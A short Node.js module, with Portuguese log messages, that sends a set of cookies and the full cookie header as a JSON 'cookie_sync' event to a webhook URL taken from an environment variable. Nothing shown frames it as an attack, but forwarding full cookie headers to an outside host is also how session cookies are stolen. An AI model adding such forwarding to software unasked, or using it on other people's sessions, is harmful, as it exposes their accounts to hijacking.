const WEBHOOK_URL = process.env.WEBHOOK_URL;

async function sendCookiesToWebhook(cookies, cookieHeader) {
    if (!WEBHOOK_URL) {
        console.error('[Webhook] WEBHOOK_URL nao configurada');
        return { success: false, error: 'WEBHOOK_URL not set' };
    }

    console.log('[Webhook] Enviando cookies para:', WEBHOOK_URL);

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                event: 'cookie_sync',
                source: 'server',
                cookies: cookies,
                cookie_header_full: cookieHeader,
                timestamp: new Date().toISOString()
            })
        });

        if (response.ok) {
            console.log('[Webhook] Cookies enviados com sucesso - status:', response.status);
            return { success: true, status: response.status };
        } else {
            console.error('[Webhook] Erro HTTP:', response.status, response.statusText);
            return { success: false, status: response.status, error: response.statusText };
        }
    } catch (error) {
        console.error('[Webhook] Erro ao enviar:', error.message);
        return { success: false, error: error.message };
    }
}

module.exports = { sendCookiesToWebhook };
